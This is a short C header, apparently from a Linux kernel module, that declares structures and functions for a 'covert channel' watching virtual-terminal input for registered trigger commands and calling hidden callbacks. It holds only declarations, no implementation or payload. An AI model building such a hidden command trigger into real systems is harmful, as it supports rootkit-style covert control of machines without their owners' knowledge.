#ifndef VT_CHANNEL_H
#define VT_CHANNEL_H

#define VT_BUFFER_LENGTH 1024

#define CMD_LENGTH 1024

// A struct which represents a command to detect in our covert channel
// and a functions to invoke (with an optinal argument)
struct command {
  char* name;
  void (*f)(char*);
};

// A struct with a buffer for each virtual terminal
// (organized as a linked list, could be improved to use a hash table or tree)
struct vt_buffer {
  char buffer[VT_BUFFER_LENGTH + 1];
  int buffer_pos;
  char* vt;
  struct list_head list;
};

/*
 * Functions
 */

// Add a new command
extern void add_command(char* name, void (*f)(char*));

// Initialize the VT channel module
extern void init_vt_channel(void);

// Remove the VT channel module
extern void finalize_vt_channel(void);

#endif
